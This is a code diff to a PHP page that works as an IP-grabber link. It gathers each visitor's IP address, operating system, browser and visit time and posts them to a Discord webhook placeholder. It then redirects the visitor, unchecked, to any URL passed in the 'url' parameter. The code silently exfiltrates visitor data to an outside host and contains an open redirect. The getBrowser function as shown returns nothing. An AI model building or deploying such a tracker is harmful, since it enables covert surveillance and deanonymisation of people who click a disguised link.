@@ -29,10 +29,15 @@ function getOS() {
                             '/blackberry/i'         =>  'BlackBerry',
                             '/webos/i'              =>  'Mobile',
 			    '/Windows Phone/i'      =>  'Windows Phone'
-                        );
-
+    		);
+	
+    foreach ($os_array as $regex => $value) { 
+        if (preg_match($regex, $user_agent)) {
+            $os_platform    =   $value;
+        }
+    }   
+    return $os_platform;
 }
-
 function getBrowser() {
     global $user_agent;
     $browser        =   "Unknown Browser";
@@ -52,5 +57,29 @@ function getBrowser() {
 			    '/Bot/i'	    =>	'Spam',
 			    '/Valve Steam GameOverlay/i'  =>  'Steam',
                             '/mobile/i'     =>  'Mobile'
-                        );
+    		);
 }
+
+$user_os        =   getOS();
+$user_browser   =   getBrowser();
+$ip = $_SERVER['REMOTE_ADDR'];
+$site_refer = $_SERVER['HTTP_REFERER'];
+	if($site_refer == ""){
+		$site = "dirrect connection";
+	}
+
+else{
+		$site = $site_refer;
+	}
+$time = date('Y-m-d H:i:s');
+$make_json = json_encode(array ('content'=>"$ip | $user_os | $user_browser | $time \n"));
+$exec = curl_init("PUT_YOUR_WEBHOOK_HERE"); // <----- Discord Webhook
+curl_setopt( $exec, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
+curl_setopt( $exec, CURLOPT_POST, 1);
+curl_setopt( $exec, CURLOPT_POSTFIELDS, $make_json);
+curl_setopt( $exec, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt( $exec, CURLOPT_HEADER, 0);
+curl_setopt( $exec, CURLOPT_RETURNTRANSFER, 1);
+$response = curl_exec( $exec );
+header("Location: " . $_GET["url"], true);
+?>
